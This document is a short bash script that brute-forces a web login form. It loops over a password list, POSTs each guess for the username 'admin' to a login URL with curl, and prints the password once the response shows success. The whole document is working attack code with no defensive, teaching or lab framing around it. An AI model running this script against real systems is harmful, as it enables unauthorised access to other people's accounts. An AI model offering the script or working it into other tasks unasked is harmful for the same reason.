#!/bin/bash

# URL of the login page
login_url="http://example.com/login"

# File containing passwords
passwords_file="passwords.txt"

# Username
username="admin"

# Iterate over each password in the file
while IFS= read -r password; do
    # Prepare the data for login
    data="username=$username&password=$password"

    # Send POST request to the login page and capture response
    response=$(curl -s -X POST -d "$data" "$login_url")

    # Check if login was successful (you may need to adjust based on the actual response)
    if [[ $response == *"Login successful"* ]]; then
        echo "Password found: $password"
        break  # Exit loop if password is found
    elif [[ $response == *"Incorrect password"* ]]; then
        echo "Incorrect password: $password"
    else
        echo "Error: Unable to access login page or blocked"
        exit 1  # Exit the script if there's an error
    fi
done < "$passwords_file"
